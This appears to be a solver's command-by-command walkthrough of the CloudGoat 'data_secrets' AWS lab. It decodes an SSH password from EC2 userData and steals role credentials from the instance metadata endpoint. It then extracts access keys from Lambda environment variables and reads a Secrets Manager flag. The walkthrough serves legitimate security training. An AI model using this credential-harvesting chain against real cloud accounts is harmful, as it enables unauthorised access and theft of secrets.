```zsh
cloudgoat config whitelist --auto
cloudgoat create data_secrets

aws configure --profile start_user
aws sts get-caller-identity --profile start_user
#"Arn": "arn:aws:iam::266877689244:user/cg-start-user-cgidpxl163lry2"

aws iam get-account-summary --profile start_user
aws iam get-user --profile start_user
aws iam list-groups-for-user --user-name cg-start-user-cgidpxl163lry2 --profile start_user
#nothing
#nothing on list-user-policies and list-attached-user-policies as well
aws s3 ls --profile start_user
#nothing

aws ec2 describe-instances --profile start_user | jq
#"PublicIp": "44.200.6.150"
#"InstanceId": "i-0ba08a4f92a95bad4"
```

enumerate the ec2 instance in depth
```zsh
aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --region us-east-1 --profile start_user
#IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK

echo "IyEvYml...." | base64 -d
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart
#Seems like ssh creds
```

ssh into the ec2 as "ec2-user"
```zsh
ssh ec2-user@44.200.6.150
#CloudGoatInstancePassword!

curl http://169.254.169.254/latest/meta-data/iam/security-credentials
#cg-ec2-role-cgidpxl163lry2
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidpxl163lry2
#new creds!
```

Enum with new creds
```zsh
aws configure --profile ec2_role
#all steps, and then lambda
aws lambda list-functions --profile ec2_role | jq
#"FunctionName": "admin_function"
#"FunctionName": "cg-lambda-function-cgidpxl163lry2"
#"FunctionName": "admin_function2"

#get more deets, and extract the lambda env vars
aws lambda get-function --function-name admin_function --region us-east-1 --profile ec2_role | jq
aws lambda get-function --function-name admin_function2 --region us-east-1 --profile ec2_role | jq
aws lambda get-function --function-name  cg-lambda-function-cgidpxl163lry2 --region us-east-1 --profile ec2_role | jq
    "Environment": {
      "Variables": {
        "DB_USER_ACCESS_KEY": "AKIAT4IZGLWOAMGMPBMM",
        "DB_USER_SECRET_KEY": "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"
#new creds, again!
```
enum with new creds
```zsh
aws configure --profile lam_user
#nothing in all normal enumerations
#looked up in walkthrough to find aws secretsmanager, used to store high-value secrets.
aws secretsmanager list-secrets --profile lam_user
"Tags": [
                {
                    "Key": "Name",
                    "Value": "cg-final-flag-cgidpxl163lry2"
                }
aws secretsmanager get-secret-value --secret-id cg-final-flag-cgidpxl163lry2 --profile lam_user
{
    "Name": "cg-final-flag-cgidpxl163lry2",
    "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
```